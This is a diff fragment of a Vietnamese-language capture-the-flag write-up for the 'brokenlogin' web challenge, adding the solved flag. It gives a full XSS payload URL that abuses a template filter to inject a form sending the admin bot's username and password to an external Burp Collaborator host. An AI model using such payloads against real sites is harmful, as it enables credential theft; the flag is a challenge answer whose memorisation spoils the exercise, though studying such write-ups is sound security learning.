@@ -121,3 +121,5 @@ Như vậy, ta cần đọc request login do admin bot submit. Đọc file `app.
 Để bypass length, ta dùng `/?message={{request.args.a|safe}}&a=abc`. Khi `message` được load vào template, nó sẽ đọc tham số `a` trong query string và thay thế bằng giá trị của `a` khiến chuỗi`abc` được hiển thị. Ta thấy website chỉ escape biến `message` => XSS với parameter `a` => có thể tạo payload khiến Admin Bot execute script, gửi request đến BurpCollaborator.
 
 Payload cuối cùng như sau: `https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&a=%3Cform+action%3D%22https%3A%2F%2Fuywcqez17hkq9srcsampsedao1urig.oastify.com%2Ftest%22+method%3D%22POST%22%3E%3Cinput+type%3D%22text%22+name%3D%22username%22%3E%3Cinput+type%3D%22text%22+name%3D%22password%22%3E%3Cinput+type%3D%22submit%22+value%3D%22SUBMIT%22%3E%3C%2Fform%3E`
+
+Flag: `actf{adm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9}`
